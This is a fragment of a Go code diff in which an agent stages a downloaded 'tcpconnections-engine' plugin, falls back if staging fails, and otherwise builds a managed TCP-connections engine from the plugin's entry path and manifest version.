+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "tcpconnections-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("tcp-connections: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := tcpconnectionsengine.NewManagedTcpConnectionsEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
 }
 
 type recoveryModule struct {
